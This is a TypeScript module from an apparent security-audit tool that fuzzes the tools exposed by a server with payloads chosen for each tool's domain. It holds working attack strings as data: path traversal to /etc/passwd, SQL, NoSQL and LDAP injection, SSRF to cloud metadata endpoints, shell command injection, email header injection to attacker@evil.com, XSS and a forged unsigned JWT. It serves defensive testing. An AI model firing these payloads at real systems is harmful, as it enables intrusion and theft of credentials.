import {
  Severity,
  CheckStatus,
  type AuditModule,
  type ModuleContext,
  type CheckResult,
  type ToolInfo,
} from "../types/index.js";

/**
 * Context-Aware Fuzzer Module.
 *
 * Unlike the generic active-fuzzer which sends the same payloads to every
 * tool regardless of purpose, this module analyzes what a tool claims to do
 * and sends payloads tailored to that specific domain.
 *
 * A manual pentester thinks: "This is a filesystem tool → I should try path
 * traversal. This is a database tool → I should try SQL injection. This is
 * a network tool → I should try SSRF."
 *
 * This module automates that reasoning.
 *
 * Finding prefixes: CAF-001 through CAF-006
 */
export class ContextAwareFuzzerModule implements AuditModule {
  id = "context-aware-fuzzer";
  name = "Context-Aware Fuzzer";
  description =
    "Sends domain-specific attack payloads based on tool type detection (filesystem, database, network, shell, etc.)";
  version = "1.0.0";
  mode = "active" as const;

  async run(context: ModuleContext): Promise<CheckResult[]> {
    const checks: CheckResult[] = [];

    if (!context.callTool || !context.activeMode) {
      checks.push({
        id: "CAF-000",
        name: "Context-Aware Fuzzer (Active)",
        status: CheckStatus.SKIP,
        message: "Requires --active flag and callTool access",
      });
      return checks;
    }

    const { capabilities: { tools }, callTool } = context;
    const probeDelay = context.probeDelay ?? 100;

    for (const tool of tools) {
      const domain = this.classifyToolDomain(tool);
      if (domain === "unknown") continue;

      const payloads = this.getPayloadsForDomain(domain, tool);
      if (payloads.length === 0) continue;

      const findings = await this.testToolWithPayloads(
        tool,
        payloads,
        callTool,
        probeDelay
      );

      if (findings.length > 0) {
        const maxSeverity = findings.some((f) => f.severity === Severity.CRITICAL)
          ? Severity.CRITICAL
          : findings.some((f) => f.severity === Severity.HIGH)
            ? Severity.HIGH
            : Severity.MEDIUM;

        checks.push({
          id: `CAF-${domain.toUpperCase()}-${tool.name}`,
          name: `Context-aware fuzz: ${tool.name} (${domain})`,
          status: CheckStatus.FAIL,
          message: `${findings.length} vulnerability(s) found in ${tool.name} using ${domain}-specific payloads`,
          finding: {
            id: `CAF-${domain.toUpperCase()}-${tool.name}`,
            module: this.id,
            severity: maxSeverity,
            title: `Context-aware vulnerability in "${tool.name}" (${domain})`,
            description:
              `Tool "${tool.name}" appears to be a ${domain} tool based on its name, ` +
              `description, and schema. Domain-specific fuzzing revealed ${findings.length} ` +
              `vulnerability pattern(s) that generic fuzzing would likely miss.`,
            evidence: {
              toolName: tool.name,
              detectedDomain: domain,
              matches: findings.map((f) => ({
                payload: f.payload,
                response: f.response.substring(0, 200),
                classification: f.classification,
              })),
            },
            remediation:
              "Apply domain-specific input validation: path canonicalization for filesystem tools, " +
              "parameterized queries for database tools, URL allowlists for network tools, " +
              "command sanitization for shell tools.",
            toolName: tool.name,
            cweId: findings[0].cweId,
            confidence: 0.85,
          },
        });
      }
    }

    if (checks.length === 0) {
      checks.push({
        id: "CAF-000",
        name: "Context-Aware Fuzzer",
        status: CheckStatus.PASS,
        message: "No context-aware vulnerabilities detected",
      });
    }

    return checks;
  }

  /**
   * Classify a tool into a domain based on name, description, and schema.
   */
  private classifyToolDomain(tool: ToolInfo): string {
    const name = tool.name.toLowerCase();
    const desc = (tool.description ?? "").toLowerCase();
    const combined = `${name} ${desc}`;

    // Filesystem patterns (use (?=[_\b]) to match word boundaries AND underscores)
    if (/(?:^|[_\s])(file|read|write|delete|path|dir|folder|ls|cat|mkdir|rm|cp|mv|touch|chmod)(?:[_\s]|$)/.test(combined)) {
      if (/(?:^|[_\s])(read|get|fetch|load|open)(?:[_\s]|$)/.test(name) || /(?:^|[_\s])file(?:[_\s]|$)/.test(name)) {
        return "filesystem";
      }
    }

    // Database patterns
    if (/\b(sql|query|db|database|select|insert|update|delete|table|record|row|column|mongo|postgres|mysql)\b/.test(combined)) {
      return "database";
    }

    // Network / URL patterns
    if (/\b(url|http|fetch|request|curl|wget|web|api|endpoint|proxy|webhook|callback|download|upload)\b/.test(combined)) {
      return "network";
    }

    // Shell / command patterns
    if (/\b(exec|run|shell|bash|sh|cmd|command|system|spawn|process|eval|script|python|node|npm)\b/.test(combined)) {
      return "shell";
    }

    // Email / messaging
    if (/\b(email|mail|send|message|sms|slack|notify|alert|push|broadcast)\b/.test(combined)) {
      return "messaging";
    }

    // Authentication / credentials
    if (/\b(auth|login|password|token|credential|key|secret|session|cookie|jwt|oauth|sso)\b/.test(combined)) {
      return "auth";
    }

    return "unknown";
  }

  /**
   * Get payloads tailored to a specific domain.
   */
  private getPayloadsForDomain(
    domain: string,
    tool: ToolInfo
  ): Array<{ label: string; payload: Record<string, unknown>; severity: Severity; cweId: string; checkResponse: (resp: string) => boolean }> {
    const stringParam = this.findStringParam(tool);
    if (!stringParam) return [];

    switch (domain) {
      case "filesystem":
        return [
          {
            label: "path-traversal-basic",
            payload: { [stringParam]: "../../../etc/passwd" },
            severity: Severity.HIGH,
            cweId: "CWE-22",
            checkResponse: (r) =>
              r.includes("root:x:0:0:") ||
              r.includes("bin:x:") ||
              r.includes("Permission denied") ||
              r.includes("No such file") && !r.includes("invalid"),
          },
          {
            label: "path-traversal-null-byte",
            payload: { [stringParam]: "file.txt\0../../../etc/passwd" },
            severity: Severity.HIGH,
            cweId: "CWE-22",
            checkResponse: (r) => r.includes("root:x:") || r.includes("null") || r.includes("\0"),
          },
          {
            label: "path-traversal-unicode",
            payload: { [stringParam]: "..\u2215..\u2215..\u2215etc\u2215passwd" },
            severity: Severity.HIGH,
            cweId: "CWE-22",
            checkResponse: (r) => r.includes("root:x:") || r.includes("unicode"),
          },
          {
            label: "symlink-traversal",
            payload: { [stringParam]: "/tmp/symlink_to_etc_passwd" },
            severity: Severity.MEDIUM,
            cweId: "CWE-59",
            checkResponse: (r) => r.includes("root:x:") || r.includes("symlink"),
          },
          {
            label: "proc-self-environ",
            payload: { [stringParam]: "/proc/self/environ" },
            severity: Severity.HIGH,
            cweId: "CWE-200",
            checkResponse: (r) => r.includes("PATH=") || r.includes("HOME=") || r.includes("USER="),
          },
        ];

      case "database":
        return [
          {
            label: "sql-injection-tautology",
            payload: { [stringParam]: "' OR '1'='1" },
            severity: Severity.CRITICAL,
            cweId: "CWE-89",
            checkResponse: (r) =>
              (r.includes("[") && r.includes("]")) || // JSON array response
              r.includes("rows") ||
              r.includes("results") ||
              r.includes("data"),
          },
          {
            label: "sql-injection-union",
            payload: { [stringParam]: "' UNION SELECT username,password FROM users--" },
            severity: Severity.CRITICAL,
            cweId: "CWE-89",
            checkResponse: (r) => r.includes("username") && r.includes("password"),
          },
          {
            label: "nosql-injection",
            payload: { [stringParam]: '{"$gt": ""}' },
            severity: Severity.HIGH,
            cweId: "CWE-89",
            checkResponse: (r) => r.includes("[") || r.includes("{"),
          },
          {
            label: "ldap-injection",
            payload: { [stringParam]: "*)(uid=*))(&(uid=*" },
            severity: Severity.HIGH,
            cweId: "CWE-90",
            checkResponse: (r) => r.includes("dn:") || r.includes("objectClass"),
          },
        ];

      case "network":
        return [
          {
            label: "ssrf-metadata-aws",
            payload: { [stringParam]: "http://169.254.169.254/latest/meta-data/" },
            severity: Severity.CRITICAL,
            cweId: "CWE-918",
            checkResponse: (r) =>
              /ami[-_]?id/i.test(r) ||
              /instance[-_]?id/i.test(r) ||
              /local[-_]?ipv4/i.test(r) ||
              /public[-_]?keys/i.test(r),
          },
          {
            label: "ssrf-metadata-gcp",
            payload: { [stringParam]: "http://metadata.google.internal/computeMetadata/v1/" },
            severity: Severity.CRITICAL,
            cweId: "CWE-918",
            checkResponse: (r) => r.includes("project-id") || r.includes("instance/"),
          },
          {
            label: "ssrf-localhost",
            payload: { [stringParam]: "http://127.0.0.1:22" },
            severity: Severity.HIGH,
            cweId: "CWE-918",
            checkResponse: (r) =>
              r.includes("SSH") ||
              r.includes("Connection refused") ||
              r.includes("timeout"),
          },
          {
            label: "ssrf-internal-network",
            payload: { [stringParam]: "http://192.168.1.1" },
            severity: Severity.HIGH,
            cweId: "CWE-918",
            checkResponse: (r) => r.includes("<html") || r.includes("router") || r.includes("login"),
          },
          {
            label: "ssrf-dns-rebinding",
            payload: { [stringParam]: "http://127.0.0.1.nip.io" },
            severity: Severity.HIGH,
            cweId: "CWE-918",
            checkResponse: (r) => r.includes("<html") || r.includes("200"),
          },
        ];

      case "shell":
        return [
          {
            label: "command-injection-semicolon",
            payload: { [stringParam]: "; cat /etc/passwd" },
            severity: Severity.CRITICAL,
            cweId: "CWE-78",
            checkResponse: (r) => r.includes("root:x:") || r.includes("bin:x:"),
          },
          {
            label: "command-injection-backtick",
            payload: { [stringParam]: "`cat /etc/passwd`" },
            severity: Severity.CRITICAL,
            cweId: "CWE-78",
            checkResponse: (r) => r.includes("root:x:") || r.includes("command"),
          },
          {
            label: "command-injection-pipe",
            payload: { [stringParam]: "| cat /etc/passwd" },
            severity: Severity.CRITICAL,
            cweId: "CWE-78",
            checkResponse: (r) => r.includes("root:x:"),
          },
          {
            label: "command-injection-dollar",
            payload: { [stringParam]: "$(cat /etc/passwd)" },
            severity: Severity.CRITICAL,
            cweId: "CWE-78",
            checkResponse: (r) => r.includes("root:x:"),
          },
          {
            label: "command-injection-newline",
            payload: { [stringParam]: "\ncat /etc/passwd\n" },
            severity: Severity.CRITICAL,
            cweId: "CWE-78",
            checkResponse: (r) => r.includes("root:x:"),
          },
        ];

      case "messaging":
        return [
          {
            label: "email-header-injection",
            payload: { [stringParam]: "test@example.com\nBcc: attacker@evil.com" },
            severity: Severity.HIGH,
            cweId: "CWE-93",
            checkResponse: (r) => r.includes("sent") || r.includes("delivered"),
          },
          {
            label: "html-email-xss",
            payload: { [stringParam]: "<script>alert('xss')</script>" },
            severity: Severity.MEDIUM,
            cweId: "CWE-79",
            checkResponse: (r) => r.includes("script") || r.includes("html"),
          },
        ];

      case "auth":
        return [
          {
            label: "jwt-none-alg",
            payload: { [stringParam]: "eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJzdWIiOiIxMjMifQ." },
            severity: Severity.CRITICAL,
            cweId: "CWE-347",
            checkResponse: (r) => r.includes("valid") || r.includes("authenticated") || r.includes("token"),
          },
          {
            label: "sql-auth-bypass",
            payload: { [stringParam]: "admin' OR '1'='1' --" },
            severity: Severity.CRITICAL,
            cweId: "CWE-89",
            checkResponse: (r) => r.includes("welcome") || r.includes("dashboard") || r.includes("authenticated"),
          },
        ];

      default:
        return [];
    }
  }

  private async testToolWithPayloads(
    tool: ToolInfo,
    payloads: Array<{ label: string; payload: Record<string, unknown>; severity: Severity; cweId: string; checkResponse: (resp: string) => boolean }>,
    callTool: (name: string, args: Record<string, unknown>) => Promise<unknown>,
    probeDelay: number
  ): Promise<Array<{ payload: string; response: string; classification: string; severity: Severity; cweId: string }>> {
    const findings: Array<{ payload: string; response: string; classification: string; severity: Severity; cweId: string }> = [];

    for (const { label, payload, severity, cweId, checkResponse } of payloads) {
      try {
        const result = await callTool(tool.name, payload);
        const responseStr = typeof result === "string" ? result : JSON.stringify(result);

        // Check if response indicates vulnerability
        if (checkResponse(responseStr)) {
          findings.push({
            payload: label,
            response: responseStr.substring(0, 300),
            classification: `${label}-triggered`,
            severity,
            cweId,
          });
        }

        // Also check for 5xx errors (server crash = vulnerability)
        if (responseStr.includes("SERVER_ERROR") || responseStr.includes("500")) {
          findings.push({
            payload: label,
            response: responseStr.substring(0, 300),
            classification: `${label}-server-crash`,
            severity: Severity.HIGH,
            cweId: "CWE-20",
          });
        }

        if (probeDelay > 0) await new Promise((r) => setTimeout(r, probeDelay));
      } catch {
        // Tool rejected payload — could be blocked or crashed
      }
    }

    return findings;
  }

  private findStringParam(tool: ToolInfo): string | null {
    const props = (tool.inputSchema as any)?.properties;
    if (!props) return null;
    for (const [key, val] of Object.entries(props)) {
      if ((val as any).type === "string") return key;
    }
    return null;
  }
}
